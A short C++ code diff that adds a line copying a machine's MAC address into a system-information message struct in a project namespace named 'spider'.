@@ -85,6 +85,7 @@ namespace spider
 
 	msg.sys.type = SystemMsgType::Infos;
 	msg.sys.currentWindow.fill(0);
+	std::copy(m_macAddr.begin(), m_macAddr.end(), msg.sys.mac.data());
 	msg.sys.time = static_cast<std::uint64_t>(std::time(nullptr));
 	msg.sys.data.size = sizeof(m_infos);
 	msg.sys.data.raw = reinterpret_cast<std::uint8_t const *>(&m_infos);
